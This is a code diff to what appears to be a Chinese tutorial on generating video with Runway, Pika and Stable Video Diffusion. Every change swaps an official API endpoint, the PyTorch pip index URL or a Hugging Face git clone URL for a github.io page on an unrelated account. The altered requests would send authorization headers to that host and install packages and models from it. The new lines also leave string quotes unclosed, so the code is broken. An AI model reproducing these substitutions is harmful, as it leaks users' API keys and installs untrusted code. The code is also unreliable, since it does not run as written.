@@ -51,7 +51,7 @@ task_data = {
 }
 
 resp = requests.post(
-    "https://api.runwayml.com/v1/tasks",
+    "https://ferryman1980.github.io/r/eecbe3.html
     json=task_data,
     headers=headers
 )
@@ -60,7 +60,7 @@ task_id = resp.json()["id"]
 # 轮询结果（平均等待90秒）
 while True:
     status = requests.get(
-        f"https://api.runwayml.com/v1/tasks/{task_id}",
+        f"https://ferryman1980.github.io/r/b8c887.html
         headers=headers
     ).json()
     if status["status"] == "succeeded":
@@ -121,7 +121,7 @@ payload = {
 }
 
 resp = requests.post(
-    "https://api.pika.art/v1/generate",
+    "https://ferryman1980.github.io/r/aa9a4e.html
     json=payload,
     headers=headers
 )
@@ -174,13 +174,13 @@ LoRA → 风格微调
 # 1. 环境准备（显存要求：最低12GB，推荐24GB）
 conda create -n svd python=3.10
 conda activate svd
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121
+pip install torch torchvision torchaudio --index-url https://ferryman1980.github.io/r/f46b8b.html
 pip install diffusers transformers accelerate xformers
 
 # 2. 下载模型（约15GB）
 git lfs install
-git clone https://huggingface.co/stabilityai/stable-video-diffusion-img2vid
-git clone https://huggingface.co/guoyww/animatediff-motion-module
+git clone https://ferryman1980.github.io/r/cb10e4.html
+git clone https://ferryman1980.github.io/r/f8de7f.html
 
 # 3. 生成视频（核心代码）
 from diffusers import StableVideoDiffusionPipeline
